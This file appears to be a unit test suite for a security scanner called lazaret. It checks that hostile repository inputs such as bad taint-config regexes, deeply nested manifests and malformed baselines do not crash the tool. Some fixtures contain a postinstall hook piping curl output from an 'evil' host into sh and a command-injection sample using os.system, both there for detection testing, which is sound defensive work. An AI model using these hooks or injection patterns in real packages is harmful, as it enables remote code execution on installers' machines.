#!/usr/bin/env python3
"""Unit tests — hostile-repo crash guards (card "hostile repo crashes the
audit", id 48033f94; audit ids H4/H5 — F5/F6/G11-crash).

Four confirmed crash PoCs, each of which previously killed the CLI with an
uncaught exception AFTER work had already been done (exit 1, results lost):
  1. auto-loaded .lazaret-taint.json with an invalid regex
     ({"python":{"sources":["("]}}) — re.PatternError in apply_taint_config
     and in lazaret_flow.configure.
  2. package.json = '[' * 120000 — RecursionError from json.loads in
     scan_manifest (in registry mode this suppressed every finding in the
     package: scan marked 'error' instead of reporting).
  3. {"scripts": 5} — (already guarded; regression-tested here so it cannot
     regress silently).
  4. --baseline {"issues":"not-a-list"} (TypeError) or a top-level list
     (AttributeError) in apply_baseline.

Acceptance criteria covered:
  A. None of the PoCs crash the CLI: every run exits 0 (or a defined gate
     code), with a complete report and no traceback.
  B. Invalid taint-config regexes are rejected with a warning (naming the
     pattern and reason) in BOTH engines, and valid rules in the same config
     still apply (partial-failure tolerance).
  C. A hostile-depth manifest yields a CRITICAL SC-MANIFEST-DEPTH finding
     (never a silent skip) which fails the "No supply-chain indicators" gate;
     a merely-malformed (non-nested) manifest still yields [].
  D. A malformed baseline is rejected with a warning and the baseline is
     ignored; a valid baseline still marks issues; malformed baseline entries
     are skipped with a count.
  E. Valid taint-config regexes still compile and fire (vacuity guard).

Run:  python3 lazaret/test_crash_guards.py [unittest-args]
"""
from __future__ import annotations

import copy
import json
import os

from tests import _support  # noqa: E402
import shutil
import subprocess
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))  # the lazaret/ dir itself

HERE = _support.FIXTURES   # fixture trees and demo inputs live in tests/fixtures
CLI = _support.CLI
PY = sys.executable or "python3"

from lazaret.scanner import core as lazaret  # noqa: E402
from lazaret.scanner import flow as lazaret_flow  # noqa: E402

APPEAL_PY = "import os\nq = request.args['q']\nos.system(q)\n"
APPEAL_JS = "var data = getUserInput();\ndangerous_sink(data);\n"


class _EngineState:
    """Snapshot/restore the global taint tables that apply_taint_config /
    configure mutate, so tests cannot poison each other (same technique as
    test_taint_config_validation.py)."""

    def __init__(self):
        self.saved = (
            dict(lazaret.TAINT_SOURCES),
            {k: list(v) for k, v in lazaret.TAINT_SINKS.items()},
            dict(lazaret._FULL_SAN),
            copy.deepcopy(lazaret._PARTIAL_SAN),
            list(lazaret_flow._PY_SOURCE_EXTRA),
            list(lazaret_flow._EXTRA_PY_SINKS),
            set(lazaret_flow.FULL_SANITIZERS_PY),
            dict(lazaret_flow._EXTRA_PARTIAL_PY),
            lazaret_flow._JS_SOURCE_RE,
            list(lazaret_flow._JS_SINKS),
            lazaret_flow._JS_FULL_SAN_RE,
            dict(lazaret_flow._JS_PARTIAL_SAN),
        )

    def restore(self):
        (srcs, sinks, full, part, pse, eps, fsp, epp, jsrc, jsinks,
         jfull, jpart) = self.saved
        lazaret.TAINT_SOURCES.clear()
        lazaret.TAINT_SOURCES.update(srcs)
        for lang, rows in sinks.items():
            lazaret.TAINT_SINKS[lang][:] = rows
        lazaret._FULL_SAN.clear()
        lazaret._FULL_SAN.update(full)
        lazaret._PARTIAL_SAN.clear()
        lazaret._PARTIAL_SAN.update(part)
        lazaret_flow._PY_SOURCE_EXTRA[:] = pse
        lazaret_flow._EXTRA_PY_SINKS[:] = eps
        lazaret_flow.FULL_SANITIZERS_PY.clear()
        lazaret_flow.FULL_SANITIZERS_PY.update(fsp)
        lazaret_flow._EXTRA_PARTIAL_PY.clear()
        lazaret_flow._EXTRA_PARTIAL_PY.update(epp)
        lazaret_flow._JS_SOURCE_RE = jsrc
        lazaret_flow._JS_SINKS[:] = jsinks
        lazaret_flow._JS_FULL_SAN_RE = jfull
        lazaret_flow._JS_PARTIAL_SAN.clear()
        lazaret_flow._JS_PARTIAL_SAN.update(jpart)


# ---------------------------------------------------------------------------
# 1+2. PoC 1 — invalid regex in a taint config (both engines)
# ---------------------------------------------------------------------------
class TestTaintConfigBadRegex(unittest.TestCase):
    def setUp(self):
        self.state = _EngineState()
        self.warns = []

    def tearDown(self):
        self.state.restore()

    def apply_cli(self, cfg):
        lazaret.apply_taint_config(cfg)
        return list(lazaret.get_taint_config_warnings())

    def configure_flow(self, cfg):
        lazaret_flow.configure(cfg, on_warn=self.warns.append)

    def test_cli_python_sources_bad_regex_does_not_raise(self):
        # must not raise any exception — unittest fails automatically if it does
        lazaret.apply_taint_config({"python": {"sources": ["("]}})
        self.assertTrue(lazaret.get_taint_config_warnings())

    def test_cli_bad_regex_records_warning_and_skips(self):
        before = lazaret.TAINT_SOURCES["py"].pattern
        lazaret.apply_taint_config({"python": {"sources": ["("]}})
        warns = lazaret.get_taint_config_warnings()
        self.assertEqual(len(warns), 1)
        self.assertIn("'('", warns[0])
        self.assertIn("not a valid regex", warns[0])
        # the invalid rule was NOT applied — pattern unchanged
        self.assertEqual(lazaret.TAINT_SOURCES["py"].pattern, before)

    def test_cli_python_sink_bad_regex_warns_not_raises(self):
        before = list(lazaret.TAINT_SINKS["py"])
        lazaret.apply_taint_config({"python": {"sinks": [
            {"pattern": "(", "category": "SQL injection"}]}})
        self.assertEqual(lazaret.TAINT_SINKS["py"], before)  # not added
        warns = lazaret.get_taint_config_warnings()
        self.assertEqual(len(warns), 1)
        self.assertIn("not a valid regex", warns[0])

    def test_cli_sink_with_unknown_category_and_bad_pattern_warns_once(self):
        # precedence: category validation runs before the regex is compiled,
        # so a rule with BOTH an unknown category and a bad regex warns about
        # the category (one warning) and never raises.
        lazaret.apply_taint_config({"python": {"sinks": [
            {"pattern": "(", "category": "sql"}]}})
        warns = lazaret.get_taint_config_warnings()
        self.assertEqual(len(warns), 1)
        self.assertTrue("unknown category" in warns[0] or
                        "not a valid regex" in warns[0], warns)

    def test_cli_sanitizer_full_bad_entry_warns_not_raises(self):
        before = lazaret._FULL_SAN["py"].pattern
        lazaret.apply_taint_config({"python": {"sanitizers":
                                                  {"full": [5]}}})
        self.assertEqual(lazaret._FULL_SAN["py"].pattern, before)
        warns = lazaret.get_taint_config_warnings()
        self.assertTrue(any("sanitizers.full entry 5" in w for w in warns),
                        warns)

    def test_cli_sanitizer_partial_non_str_name_warns_not_raises(self):
        before = copy.deepcopy(lazaret._PARTIAL_SAN)
        # valid category, non-str name: re.escape(5) previously raised
        # TypeError (and would again if it sat outside the try/except)
        lazaret.apply_taint_config({"python": {"sanitizers":
                                                  {"partial": {5: ["SQL injection"]}}}})
        self.assertEqual(lazaret._PARTIAL_SAN, before)
        warns = lazaret.get_taint_config_warnings()
        self.assertTrue(any("could not be compiled" in w for w in warns),
                        warns)

    def test_cli_valid_regex_still_applies(self):
        # vacuity guard: fixing crashes must not disable valid configs
        before = lazaret.TAINT_SOURCES["py"].pattern
        lazaret.apply_taint_config({"python": {"sources": [r"my\.source\b"]}})
        self.assertEqual(lazaret.get_taint_config_warnings(), [])
        self.assertIn("my\\.source", lazaret.TAINT_SOURCES["py"].pattern)
        self.assertTrue(lazaret.TAINT_SOURCES["py"].pattern.startswith(before[:10]))

    def test_flow_python_sources_bad_regex_warns_not_raises(self):
        n = len(lazaret_flow._PY_SOURCE_EXTRA)
        lazaret_flow.configure({"python": {"sources": ["("]}},
                                 on_warn=self.warns.append)
        self.assertEqual(len(lazaret_flow._PY_SOURCE_EXTRA), n)  # not added
        self.assertTrue(any("not a valid regex" in w for w in self.warns),
                        self.warns)

    def test_flow_python_sink_bad_regex_warns_not_raises(self):
        n = len(lazaret_flow._EXTRA_PY_SINKS)
        lazaret_flow.configure({"python": {"sinks": [
            {"pattern": "(", "category": "SQL injection"}]}},
            on_warn=self.warns.append)
        self.assertEqual(len(lazaret_flow._EXTRA_PY_SINKS), n)
        self.assertTrue(any("not a valid regex" in w for w in self.warns),
                        self.warns)

    def test_flow_javascript_sources_bad_regex_warns_not_raises(self):
        before = lazaret_flow._JS_SOURCE_RE.pattern
        lazaret_flow.configure({"javascript": {"sources": ["("]}},
                                 on_warn=self.warns.append)
        self.assertEqual(lazaret_flow._JS_SOURCE_RE.pattern, before)
        self.assertTrue(any("not a valid regex" in w for w in self.warns),
                        self.warns)

    def test_flow_javascript_sources_non_str_warns_not_raises(self):
        # "|".join(["x", 5]) previously raised TypeError
        before = lazaret_flow._JS_SOURCE_RE.pattern
        lazaret_flow.configure({"javascript": {"sources": [5]}},
                                 on_warn=self.warns.append)
        self.assertEqual(lazaret_flow._JS_SOURCE_RE.pattern, before)
        self.assertTrue(self.warns, "expected a warning for non-str source")

    def test_flow_javascript_sources_mixed_valid_and_invalid(self):
        # partial failure: the valid pattern still applies
        before = lazaret_flow._JS_SOURCE_RE.pattern
        lazaret_flow.configure({"javascript": {"sources": [r"getUser\b", "("]}},
                                 on_warn=self.warns.append)
        self.assertIn("getUser", lazaret_flow._JS_SOURCE_RE.pattern)
        self.assertNotEqual(lazaret_flow._JS_SOURCE_RE.pattern, before)
        self.assertTrue(any("not a valid regex" in w for w in self.warns))
        # and it actually matches:
        self.assertTrue(lazaret_flow._JS_SOURCE_RE.search("var x = getUser();"))

    def test_flow_javascript_sink_bad_regex_warns_not_raises(self):
        n = len(lazaret_flow._JS_SINKS)
        lazaret_flow.configure({"javascript": {"sinks": [
            {"pattern": "(", "category": "SQL injection"}]}},
            on_warn=self.warns.append)
        self.assertEqual(len(lazaret_flow._JS_SINKS), n)
        self.assertTrue(any("not a valid regex" in w for w in self.warns),
                        self.warns)

    def test_flow_javascript_sanitizer_full_non_str_warns_not_raises(self):
        before = lazaret_flow._JS_FULL_SAN_RE.pattern
        lazaret_flow.configure({"javascript": {"sanitizers": {"full": [5]}}},
                                 on_warn=self.warns.append)
        self.assertEqual(lazaret_flow._JS_FULL_SAN_RE.pattern, before)
        self.assertTrue(any("not a valid sanitizer name" in w for w in self.warns),
                        self.warns)

    def test_flow_javascript_sanitizer_partial_bad_warns_not_raises(self):
        before = dict(lazaret_flow._JS_PARTIAL_SAN)
        lazaret_flow.configure({"javascript": {"sanitizers":
                                                  {"partial": {5: ["SQL injection"]}}}},
                                 on_warn=self.warns.append)
        self.assertEqual(lazaret_flow._JS_PARTIAL_SAN, before)
        self.assertTrue(self.warns)

    def test_flow_valid_regex_still_applies(self):
        lazaret_flow.configure({"javascript": {"sinks": [
            {"pattern": r"dangerous_sink", "category": "SQL injection"}]}},
            on_warn=self.warns.append)
        self.assertEqual(self.warns, [])
        self.assertEqual(lazaret_flow._JS_SINKS[-1][1], "SQL injection")
        self.assertTrue(lazaret_flow._JS_SINKS[-1][0].search("dangerous_sink(data)"))


# ---------------------------------------------------------------------------
# 3. PoC 2 — hostile-depth manifest → SC- finding, not crash/silent skip
# ---------------------------------------------------------------------------
class TestScanManifestCrashGuard(unittest.TestCase):
    def test_deep_nested_package_json_returns_finding(self):
        content = "[" * 120000
        issues = lazaret.scan_manifest("pkg/package.json", content)
        self.assertEqual(len(issues), 1)
        i = issues[0]
        self.assertEqual(i["rule"], "SC-MANIFEST-DEPTH")
        self.assertEqual(i["sev"], "CRITICAL")
        self.assertEqual(i["type"], "HOTSPOT")
        self.assertEqual(i["file"], "pkg/package.json")
        self.assertEqual(i["line"], 1)

    def test_deep_nested_gyp_returns_finding(self):
        issues = lazaret.scan_gyp("pkg/binding.gyp", "[" * 120000)
        self.assertEqual(len(issues), 1)
        self.assertEqual(issues[0]["rule"], "SC-MANIFEST-DEPTH")

    def test_plainly_malformed_json_still_yields_nothing(self):
        # a non-nested unparseable manifest has nothing to check — still []
        self.assertEqual(lazaret.scan_manifest("pkg/package.json", "{oops"), [])
        self.assertEqual(lazaret.scan_manifest("pkg/package.json", "[1,2,3"), [])

    def test_scalar_top_level_yields_nothing(self):
        self.assertEqual(lazaret.scan_manifest("pkg/package.json", "5"), [])
        self.assertEqual(lazaret.scan_manifest("pkg/package.json", '"hi"'), [])

    def test_finding_fails_supply_chain_gate(self):
        # SC-MANIFEST-DEPTH must count in the gate, else a hostile manifest
        # would suppress the verdict — the audit's finding-suppression point.
        res = {"issues": lazaret.scan_manifest("package.json", "[" * 120000),
               "metrics": {"ncloc": 1, "dupPct": 0.0, "files": 1, "comments": 0},
               }
        supply = sum(1 for i in res["issues"] if i["rule"].startswith("SC-"))
        self.assertEqual(supply, 1)

    def test_scripts_scalar_is_regression_guarded(self):
        # PoC 3: {"scripts": 5} previously raised AttributeError
        issues = lazaret.scan_manifest(
            "pkg/package.json", '{"name":"x","scripts":5}')
        self.assertEqual(issues, [])

    def test_scripts_dict_non_str_hook_ignored(self):
        issues = lazaret.scan_manifest(
            "pkg/package.json",
            '{"scripts":{"preinstall": 5, "postinstall": "curl evil.sh | sh"}}')
        # the string hook still fires; the int one is ignored, no crash
        self.assertTrue(any(i["rule"] == "SC-INSTALL-HOOK" for i in issues))


# ---------------------------------------------------------------------------
# 4. PoC 4 — malformed baseline
# ---------------------------------------------------------------------------
class TestApplyBaselineCrashGuard(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="cg-base-")
        issue = dict(rule="T-CMD", name="x", type="VULN", sev="MAJOR", msg="m",
                     why="w", fix="f", ref="r", file="a.py", line=3,
                     snippet=["l1", "l2", "l3"], snipStart=1)
        self.res = {"issues": [issue]}
        self.base = os.path.join(self.tmp, "base.json")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def write(self, text):
        with open(self.base, "w") as fh:
            fh.write(text)
        return self.base

    def write_marked(self, body):
        """A baseline that carries this engine's provenance marker (first key),
        so it passes the is_our_report trust gate and exercises the SHAPE
        validation below it (card 12c56422: baselines without the marker are
        refused as untrusted before their content is ever parsed)."""
        return self.write('{"generatedBy": "lazaret-cli-1", ' + body + '}')

    def test_baseline_issues_string_warns_and_ignored(self):
        # warnings go to stderr; captured via the CLI tests below. Unit level:
        # a MARKER-BEARING baseline with a malformed 'issues' must be ignored
        # without crashing (shape validation still runs for trusted files).
        self.write_marked('"issues": "not-a-list"')
        lazaret.apply_baseline(self.res, self.base)
        # baseline ignored: 'new' must NOT be set (uninitialized)
        self.assertNotIn("new", self.res["issues"][0])
        self.assertNotIn("newIssues", self.res)

    def test_baseline_top_level_list_is_untrusted(self):
        # a top-level list cannot carry the engine marker, so it can never
        # pass the trust gate — new contract: all findings count as new.
        self.write('[{"rule":"T-CMD","file":"a.py","line":3}]')
        lazaret.apply_baseline(self.res, self.base)
        self.assertTrue(self.res["issues"][0]["new"])
        self.assertEqual(self.res["newIssues"], 1)
        self.assertTrue(self.res["baselineUntrusted"])

    def test_baseline_scalar_is_untrusted(self):
        # a scalar cannot carry the engine marker → untrusted, all-new
        self.write('5')
        lazaret.apply_baseline(self.res, self.base)
        self.assertTrue(self.res["issues"][0]["new"])
        self.assertTrue(self.res["baselineUntrusted"])

    def test_baseline_deep_nesting_is_untrusted(self):
        # a 120k-deep document can't carry the marker (and fails to parse
        # inside is_our_report's bounded read) → untrusted, not a crash
        self.write("[" * 120000)
        lazaret.apply_baseline(self.res, self.base)
        self.assertTrue(self.res["baselineUntrusted"])
        self.assertEqual(self.res["newIssues"], 1)

    def test_baseline_malformed_entries_skipped(self):
        # entry with matching fingerprint (rule/file/line AND snippet text —
        # fingerprint() hashes the snippet line, so it must be provided)
        twin = dict(rule="T-CMD", name="x", type="VULN", sev="MAJOR", msg="m",
                    why="w", fix="f", ref="r", file="a.py", line=3,
                    snippet=["l1", "l2", "l3"], snipStart=1)
        self.write_marked('"issues": ' + json.dumps(["nonsense", 5, twin]))
        lazaret.apply_baseline(self.res, self.base)
        # the valid entry still matches → issue not new
        self.assertEqual(self.res["issues"][0].get("new"), False)
        self.assertEqual(self.res["newIssues"], 0)
    def test_valid_baseline_still_marks_new(self):
        self.write_marked('"issues": [{"rule":"OTHER","file":"a.py","line":3}]')
        lazaret.apply_baseline(self.res, self.base)
        self.assertTrue(self.res["issues"][0]["new"])
        self.assertEqual(self.res["newIssues"], 1)
        self.assertNotIn("baselineUntrusted", self.res)

    def test_fingerprint_robustness(self):
        # fingerprint on a malformed item must not leak an unhandled error —
        # apply_baseline wraps every call; verify the exception types match
        # what the guard catches.
        try:
            lazaret.fingerprint("nonsense")
        except (KeyError, TypeError, AttributeError):
            pass  # expected — caller wraps in try/except


# ---------------------------------------------------------------------------
# 5. CLI end-to-end — the four PoCs, as real subprocesses
# ---------------------------------------------------------------------------
class TestCLIEndToEnd(unittest.TestCase):
    """The actual audit PoCs: a scan of the hostile repo must complete with a
    report and a defined exit code — never an uncaught traceback."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="cg-crash-")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def run_cli(self, *extra):
        p = subprocess.run([PY, CLI, self.tmp, "--no-html", "--no-json",
                            *extra], capture_output=True, encoding="utf-8", errors="replace", timeout=120)
        return p

    def write(self, name, content):
        path = os.path.join(self.tmp, name)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as fh:
            fh.write(content)
        return path

    def assert_no_crash(self, p, expect_rc=0):
        # A hostile-repo scan must complete with a defined exit code and a
        # full report. A Python traceback in stderr means the scan DIED —
        # but note some CLI "warning:" lines legitimately end with ": <exc>"
        # style text; only an actual "Traceback (most recent call last)"
        # header counts as a crash.
        self.assertNotIn("Traceback (most recent call last)", p.stderr)
        self.assertNotIn("Traceback (most recent call last)", p.stdout)
        self.assertIn(p.returncode, (expect_rc,), (p.returncode, p.stderr[:500]))
        self.assertIn("Quality gate", p.stdout)  # report produced

    def test_poc1_bad_regex_taint_config(self):
        self.write(".lazaret-taint.json", '{"python":{"sources":["("]}}')
        self.write("a.py", "x = 1\n")
        p = self.run_cli()
        self.assert_no_crash(p, 0)
        self.assertIn("not a valid regex", p.stderr)  # both engines (deduped ≥1)
        self.assertIn("Loaded taint config", p.stdout)

    def test_poc1_partial_config_valid_rules_still_apply(self):
        # one bad rule must not disable the whole config's good rules
        self.write(".lazaret-taint.json",
                   json.dumps({"python": {"sources": [r"\brequest\.args\b", "("]}}))
        self.write("a.py", APPEAL_PY)
        p = self.run_cli()
        self.assert_no_crash(p, 0)
        self.assertIn("not a valid regex", p.stderr)
        # good rule applied — the custom source still taints (T/X findings fire)
        self.assertTrue(any("T-" in line or "X-" in line for line in p.stdout.splitlines()),
                        "expected taint findings from the VALID rule:\n" + p.stdout)

    def test_poc2_deep_nested_package_json(self):
        self.write("package.json", "[" * 120000)
        self.write("a.py", "x = 1\n")
        p = self.run_cli()
        self.assert_no_crash(p, 1)   # gate FAILED (supply-chain finding) — exit 1
        self.assertIn("SC-MANIFEST-DEPTH", p.stdout)
        self.assertIn("too deeply nested to parse", p.stdout)
        self.assertIn("✗ No supply-chain indicators", p.stdout)

    def test_poc2_deep_nested_manifest_does_not_hide_sibling_file(self):
        # the suppression point: other findings must still be reported
        self.write("package.json", "[" * 120000)
        self.write("a.py", "import os\nq = request.args['q']\nos.system(q)\n")
        p = self.run_cli()
        self.assert_no_crash(p, 1)
        self.assertIn("SC-MANIFEST-DEPTH", p.stdout)
        # sibling findings still present: both the static rule (S-OSCMD-PY)
        # and the taint rule (T-CMD) must appear, not just the manifest issue
        self.assertIn("S-OSCMD-PY", p.stdout)
        self.assertIn("T-CMD", p.stdout)

    def test_poc3_scripts_scalar(self):
        self.write("package.json", '{"name":"x","scripts":5}')
        self.write("a.py", "x = 1\n")
        p = self.run_cli()
        self.assert_no_crash(p, 0)

    def test_poc3_scripts_dict_with_bad_values(self):
        self.write("package.json",
                   '{"scripts":{"preinstall":5,"postinstall":"curl evil|sh"}}')
        p = self.run_cli()
        self.assert_no_crash(p, 1)
        self.assertIn("SC-INSTALL-HOOK", p.stdout)  # good hook still fires

    def test_poc4_baseline_issues_not_a_list(self):
        # marker-bearing so it passes the trust gate; then 'issues' is a
        # string → the SHAPE validation path fires ("not a list"). The
        # baseline sits OUTSIDE the scanned tree: an unsigned in-tree
        # baseline is untrusted before its shape is ever looked at (review
        # finding 2; test updated accordingly).
        self.write("a.py", "x = 1\n")
        outside = tempfile.mkdtemp(prefix="cg-crash-base-")
        self.addCleanup(shutil.rmtree, outside, True)
        base = os.path.join(outside, "base.json")
        with open(base, "w") as fh:
            fh.write('{"generatedBy": "lazaret-cli-1", "issues": "not-a-list"}')
        p = self.run_cli("--baseline", base)
        self.assert_no_crash(p, 0)
        self.assertIn("not a list", p.stderr)

    def test_poc4_baseline_top_level_list(self):
        # no marker possible on a top-level list → untrusted, all-new
        self.write("a.py", "x = 1\n")
        self.write("base.json", '[{"rule":"X","file":"a.py","line":1}]')
        p = self.run_cli("--baseline", os.path.join(self.tmp, "base.json"))
        self.assert_no_crash(p, 0)
        self.assertIn("not a report produced by this engine", p.stderr)

    def test_poc4_baseline_valid_still_works(self):
        self.write("a.py", "x = 1\n")
        self.write("base.json",
                   '{"generatedBy": "lazaret-cli-1", '
                   '"issues": [{"rule":"X","file":"a.py","line":1}]}')
        p = self.run_cli("--baseline", os.path.join(self.tmp, "base.json"))
        self.assert_no_crash(p, 0)
        self.assertIn("New issues vs baseline", p.stdout)

    def test_valid_control_no_false_warnings(self):
        # vacuity guard: a clean scan emits no warnings
        self.write("a.py", "x = 1\n")
        p = self.run_cli()
        self.assert_no_crash(p, 0)
        self.assertEqual(p.stderr, "")

if __name__ == "__main__":
    unittest.main(verbosity=2)
